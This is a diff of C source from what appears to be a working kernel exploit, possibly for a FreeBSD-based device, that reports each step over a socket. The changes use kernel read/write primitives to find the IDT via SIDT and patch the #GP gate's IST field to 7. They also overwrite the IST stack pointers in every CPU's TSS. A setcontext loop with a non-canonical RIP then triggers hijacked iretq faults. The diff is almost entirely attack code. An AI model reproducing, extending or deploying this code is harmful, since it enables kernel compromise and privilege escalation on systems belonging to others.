@@ -4066,18 +4066,54 @@ broad_done:
             send_response(sock, "  TSS IST%d: 0x%lx\n", i + 1, ist_entries[i]);
         }
 
-        /* 7b. Check IDT #GP gate IST field */
-        send_response(sock, "\n7b. Checking IDT #GP gate...\n");
-        if (found_idt) {
-            uint8_t gp_gate[16];
-            if (kernel_copyout(idt_base + 13 * 16, gp_gate, 16) == 0) {
-                gp_ist_index = gp_gate[4] & 0x07;
-                send_response(sock, "  #GP gate IST field = %d\n", gp_ist_index);
+        /* 7b. Get IDT base via SIDT and read #GP gate */
+        send_response(sock, "\n7b. Reading IDT via SIDT...\n");
+        {
+            struct {
+                uint16_t limit;
+                uint64_t base;
+            } __attribute__((packed)) idtr;
+            __asm__ volatile("sidt %0" : "=m"(idtr));
+
+            send_response(sock, "  SIDT: base=0x%lx limit=%u\n",
+                          (unsigned long)idtr.base, idtr.limit);
+
+            /* Validate: kernel address, room for 256 vectors (4096 bytes) */
+            if (idtr.base >= 0xFFFF800000000000ULL && idtr.limit >= 0xFFF) {
+                idt_base = idtr.base;
+
+                uint8_t gp_gate[16];
+                if (kernel_copyout(idt_base + 13 * 16, gp_gate, 16) == 0) {
+                    gp_ist_index = gp_gate[4] & 0x07;
+
+                    uint64_t gp_handler =
+                        (uint64_t)gp_gate[0] |
+                        ((uint64_t)gp_gate[1] << 8) |
+                        ((uint64_t)gp_gate[6] << 16) |
+                        ((uint64_t)gp_gate[7] << 24) |
+                        ((uint64_t)gp_gate[8] << 32) |
+                        ((uint64_t)gp_gate[9] << 40) |
+                        ((uint64_t)gp_gate[10] << 48) |
+                        ((uint64_t)gp_gate[11] << 56);
+                    uint8_t type_attr = gp_gate[5];
+
+                    send_response(sock, "  #GP gate: handler=0x%lx IST=%d "
+                                  "type=0x%02x\n",
+                                  gp_handler, gp_ist_index, type_attr);
+
+                    if (!((type_attr & 0x8E) == 0x8E &&
+                          gp_handler >= 0xFFFF800000000000ULL)) {
+                        send_response(sock, "  WARNING: #GP gate looks invalid, "
+                                      "proceeding anyway\n");
+                    }
+                } else {
+                    send_response(sock, "  Cannot read #GP gate\n");
+                    goto step7_cleanup;
+                }
             } else {
-                send_response(sock, "  WARNING: cannot read #GP gate\n");
+                send_response(sock, "  SIDT returned unexpected value\n");
+                goto step7_cleanup;
             }
-        } else {
-            send_response(sock, "  IDT not found; will set ALL IST1-7\n");
         }
 
         /* 7c. Allocate IST page */
@@ -4104,11 +4140,30 @@ broad_done:
         send_response(sock, "  IST page PA=0x%lx, DMAP VA=0x%lx, stack top=0x%lx\n",
                       ist_page_pa, ist_dmap_va, ist_stack_top);
 
-        /* 7e. Save & modify TSS IST entries on ALL per-CPU TSSes */
-        send_response(sock, "\n7e. Modifying per-CPU TSS IST entries...\n");
-        if (found_idt && gp_ist_index > 0) {
-            /* IDT found and #GP uses a specific IST: modify that IST on all CPUs */
+        /* 7e. If #GP gate uses IST=0, patch it to use IST7 */
+        send_response(sock, "\n7e. Configuring IST for #GP...\n");
+        if (gp_ist_index == 0) {
+            /* #GP gate has no IST — patch it to use IST7 */
+            send_response(sock, "  #GP gate IST=0; patching to IST7\n");
+            if (kernel_copyout(idt_base + 13 * 16, idt_gate_saved, 16) == 0) {
+                uint8_t new_ist_byte = (idt_gate_saved[4] & 0xF8) | 7;
+                kernel_setchar(idt_base + 13 * 16 + 4, new_ist_byte);
+                idt_gate_modified = 1;
+                gp_ist_index = 7;
+                send_response(sock, "  Patched #GP gate IST: 0 -> 7\n");
+            } else {
+                send_response(sock, "  Cannot read #GP gate for patching\n");
+                goto step7_cleanup;
+            }
+        } else {
+            send_response(sock, "  #GP gate already uses IST%d\n", gp_ist_index);
+        }
+
+        /* Set the target IST entry on all per-CPU TSSes */
+        {
             int idx = gp_ist_index - 1;
+            send_response(sock, "  Setting IST%d on all CPUs to 0x%lx\n",
+                          gp_ist_index, ist_stack_top);
             for (int cpu = 0; cpu < GP_TRAP_MAX_CPUS && tss_stride > 0; cpu++) {
                 uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
                 uint32_t rsvd0;
@@ -4123,54 +4178,6 @@ broad_done:
                 send_response(sock, "  CPU%d TSS 0x%lx: IST%d -> 0x%lx (was 0x%lx)\n",
                               cpu, cpu_tss, gp_ist_index, ist_stack_top,
                               ist_saved_percpu[cpu][idx]);
-            }
-        } else if (found_idt && gp_ist_index == 0) {
-            /* #GP uses IST=0 (current stack); set IST7 on all CPUs + modify gate */
-            send_response(sock, "  #GP uses IST=0; setting IST7 and modifying gate\n");
-            gp_ist_index = 7;
-            int idx = 6; /* IST7 = index 6 */
-            for (int cpu = 0; cpu < GP_TRAP_MAX_CPUS && tss_stride > 0; cpu++) {
-                uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
-                uint32_t rsvd0;
-                uint64_t rsp0;
-                if (kernel_copyout(cpu_tss, &rsvd0, 4) != 0 || rsvd0 != 0)
-                    break;
-                if (kernel_copyout(cpu_tss + 4, &rsp0, 8) != 0 || rsp0 == 0)
-                    break;
-                ist_saved_percpu[cpu][idx] = kernel_getlong(cpu_tss + 0x24 + idx * 8);
-                kernel_setlong(cpu_tss + 0x24 + idx * 8, ist_stack_top);
-                ist_modified_percpu[cpu][idx] = 1;
-            }
-            send_response(sock, "  Set IST7 on all CPUs to 0x%lx\n", ist_stack_top);
-
-            /* Modify #GP IDT gate byte 4 to use IST7 */
-            if (kernel_copyout(idt_base + 13 * 16, idt_gate_saved, 16) == 0) {
-                uint8_t new_ist_byte = (idt_gate_saved[4] & 0xF8) | 7;
-                kernel_setchar(idt_base + 13 * 16 + 4, new_ist_byte);
-                idt_gate_modified = 1;
-                send_response(sock, "  Modified #GP gate IST: %d -> 7\n",
-                              idt_gate_saved[4] & 0x07);
-            } else {
-                send_response(sock, "  WARNING: cannot modify #GP gate\n");
-            }
-        } else {
-            /* IDT not found: set ALL IST1-7 on ALL CPUs */
-            send_response(sock, "  No IDT: setting ALL IST1-7 on all CPUs\n");
-            for (int cpu = 0; cpu < GP_TRAP_MAX_CPUS && tss_stride > 0; cpu++) {
-                uint64_t cpu_tss = tss_va + (uint64_t)cpu * tss_stride;
-                uint32_t rsvd0;
-                uint64_t rsp0;
-                if (kernel_copyout(cpu_tss, &rsvd0, 4) != 0 || rsvd0 != 0)
-                    break;
-                if (kernel_copyout(cpu_tss + 4, &rsp0, 8) != 0 || rsp0 == 0)
-                    break;
-                for (int i = 0; i < 7; i++) {
-                    ist_saved_percpu[cpu][i] = kernel_getlong(cpu_tss + 0x24 + i * 8);
-                    kernel_setlong(cpu_tss + 0x24 + i * 8, ist_stack_top);
-                    ist_modified_percpu[cpu][i] = 1;
-                }
-                send_response(sock, "  CPU%d TSS 0x%lx: all IST1-7 -> 0x%lx\n",
-                              cpu, cpu_tss, ist_stack_top);
             }
         }
 
@@ -4290,13 +4297,11 @@ broad_done:
 
         /* 7i. Trigger loop
          *
-         * Use volatile global counter instead of stack-local variable,
-         * because setcontext() restores the stack frame (including any
-         * local 'attempt' variable) back to the getcontext() save point.
-         * The volatile global survives the context restore.
-         *
-         * sigsetjmp is placed OUTSIDE the loop so that siglongjmp from
-         * the signal handler lands here with the counter intact.
+         * getcontext/setcontext form the loop: setcontext jumps back to
+         * getcontext's return point. The volatile global counter is
+         * incremented AFTER getcontext so it advances on every iteration
+         * (including setcontext-induced restores). sigsetjmp catches the
+         * signal handler's siglongjmp.
          */
         send_response(sock, "\n7i. Triggering iretq fault (up to 20 attempts)...\n");
         {
@@ -4316,45 +4321,29 @@ broad_done:
                               (uint64_t)gp_trap_mc_cs,
                               (uint64_t)gp_trap_mc_err);
             } else {
-                /* Normal path: loop triggering faults */
-                while (!gp_trap_got_result &&
-                       gp_trap_attempt_count < max_attempts) {
-                    /*
-                     * Increment BEFORE getcontext so the counter
-                     * reflects the current attempt even after
-                     * setcontext restores to this point.
-                     */
-                    gp_trap_attempt_count++;
+                ucontext_t uc;
+                getcontext(&uc);
 
-                    if ((gp_trap_attempt_count % 5) == 1) {
+                /* Increment AFTER getcontext — this runs on every
+                 * entry, including setcontext-induced returns. */
+                gp_trap_attempt_count++;
+
+                if (!gp_trap_got_result &&
+                    gp_trap_attempt_count <= max_attempts) {
+
+                    if (gp_trap_attempt_count == 1 ||
+                        (gp_trap_attempt_count % 5) == 0) {
                         send_response(sock, "  attempt %d...\n",
                                       (int)gp_trap_attempt_count);
                     }
 
-                    /*
-                     * getcontext() saves current context. setcontext()
-                     * restores it, going through kernel iretq with the
-                     * non-canonical RIP -> #GP -> IST stack -> writer
-                     * overwrites CS -> signal delivered with mc_rip =
-                     * doreti_iret.
-                     *
-                     * When setcontext restores to here, getcontext
-                     * "returns" again. The volatile global counter
-                     * lets us detect this and avoid infinite loops.
-                     */
-                    ucontext_t uc;
-                    getcontext(&uc);
-
-                    /* Check after getcontext returns (possibly via setcontext) */
-                    if (gp_trap_got_result)
-                        break;
-                    if (gp_trap_attempt_count > max_attempts)
-                        break;
-
                     uc.uc_mcontext.mc_rip = 0x8000000000000000ULL;
                     setcontext(&uc);
 
-                    /* Should not reach here - setcontext doesn't return */
+                    /* setcontext returned — kernel rejected the context */
+                    send_response(sock, "  setcontext returned at attempt %d "
+                                  "(errno=%d)\n",
+                                  (int)gp_trap_attempt_count, errno);
                 }
             }
         }
